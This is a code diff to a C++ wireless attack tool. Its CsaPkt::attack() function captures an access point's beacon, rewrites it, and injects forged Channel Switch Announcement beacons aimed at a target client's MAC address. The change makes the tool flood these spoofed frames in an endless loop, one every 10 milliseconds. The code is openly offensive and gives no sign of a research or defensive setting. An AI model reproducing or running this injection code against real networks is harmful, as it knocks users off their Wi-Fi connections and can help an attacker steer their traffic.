@@ -114,7 +114,7 @@ void CsaPkt::attack() {
     printf("Waiting for beacon from %s...\n", apMac_.toString().c_str());
 
     int cnt = 0;
-    while (true) {
+    while (true) {  // capture a valid beacon
         struct pcap_pkthdr* hdr;
         const u_char* raw;
         int res = pcap_next_ex(pcap_, &hdr, &raw);
@@ -124,10 +124,15 @@ void CsaPkt::attack() {
         std::vector<uint8_t> newPkt = processBeacon(raw, hdr->caplen);
         if (newPkt.empty()) continue;
 
-        if (pcap_inject(pcap_, newPkt.data(), newPkt.size()) < 0) {
-            fprintf(stderr, "pcap_inject failed: %s\n", pcap_geterr(pcap_));
-            break;
+        printf("Switch channel: %u -> %u, target: %s\n", curCh_, lastTargetch_, stMac_.toString().c_str());
+        while (true) {  // inject csa packet
+            if (pcap_inject(pcap_, newPkt.data(), newPkt.size()) < 0) {
+                fprintf(stderr, "pcap_inject failed: %s\n", pcap_geterr(pcap_));
+                break;
+            }
+            printf("[%d] CSA beacon sent\n", ++cnt);
+            usleep(10000);
         }
-        printf("[%d] CSA beacon sent (ch %u -> ch %u, target: %s)\n", ++cnt, curCh_, lastTargetch_, stMac_.toString().c_str());
+        
     }
 }
